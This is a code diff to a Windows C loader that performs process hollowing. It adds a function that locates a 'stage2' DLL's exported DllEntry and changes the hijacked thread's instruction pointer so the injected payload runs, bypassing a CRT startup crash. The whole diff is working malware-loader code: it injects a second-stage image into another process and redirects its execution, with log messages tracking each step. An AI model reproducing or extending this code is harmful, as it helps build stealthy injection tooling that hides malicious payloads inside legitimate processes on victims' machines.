@@ -66,6 +66,24 @@ static DWORD RvaToFileOffset(PIMAGE_NT_HEADERS ntH, DWORD rva) {
     return rva;
 }
 
+// ponytail: find a named export's RVA in the on-disk stage2 image, so we can
+// redirect the hollowed thread's Rip straight to DllEntry instead of
+// _DllMainCRTStartup (whose CRT init faults in a hand-hollowed process).
+// Returns 0 if not found — caller falls back to AddressOfEntryPoint.
+static DWORD FindExportRva(PIMAGE_NT_HEADERS ntH, LPBYTE localBuf, const char* name) {
+    PIMAGE_DATA_DIRECTORY exportDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (!exportDir->VirtualAddress || !exportDir->Size) return 0;
+    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(localBuf + RvaToFileOffset(ntH, exportDir->VirtualAddress));
+    DWORD* names  = (DWORD*)(localBuf + RvaToFileOffset(ntH, exp->AddressOfNames));
+    DWORD* funcs  = (DWORD*)(localBuf + RvaToFileOffset(ntH, exp->AddressOfFunctions));
+    WORD*  ords   = (WORD*)(localBuf + RvaToFileOffset(ntH, exp->AddressOfNameOrdinals));
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        const char* nm = (const char*)(localBuf + RvaToFileOffset(ntH, names[i]));
+        if (lstrcmpiA(nm, name) == 0) return funcs[ords[i]];
+    }
+    return 0;
+}
+
 // Apply PE relocations from the .reloc section to the remote process.
 // delta = remoteImage - targetBase. Required when the image is loaded at a
 // different base than its preferred one. Skips if the .reloc section is empty
@@ -313,7 +331,18 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     ctx.Rcx = (DWORD64)remoteImage;
     ctx.Rdx = (DWORD64)DLL_PROCESS_ATTACH;
     ctx.R8  = (DWORD64)0;
-    ctx.Rip = (DWORD64)remoteImage + ntH->OptionalHeader.AddressOfEntryPoint;
+    // ponytail: prefer stage2's exported DllEntry (skips MinGW's _DllMainCRTStartup
+    // wrapper, whose CRT init faults in a hand-hollowed process and never reached
+    // DllMain). Falls back to AddressOfEntryPoint (the CRT wrapper) when DllEntry
+    // is not exported — see stage2.c DllEntry comment.
+    DWORD entryRva = FindExportRva(ntH, stage2Buf, "DllEntry");
+    if (entryRva) {
+        ctx.Rip = (DWORD64)remoteImage + entryRva;
+        LogMessage(L"[+] Entry point: exported DllEntry (skipping _DllMainCRTStartup)");
+    } else {
+        ctx.Rip = (DWORD64)remoteImage + ntH->OptionalHeader.AddressOfEntryPoint;
+        LogMessage(L"[*] Entry point: AddressOfEntryPoint (DllEntry not exported)");
+    }
     LogMessage(L"[*] calling SetThreadContext");
     if (!SetThreadContext(pi.hThread, &ctx)) {
         LogMessage(L"[-] SetThreadContext failed");
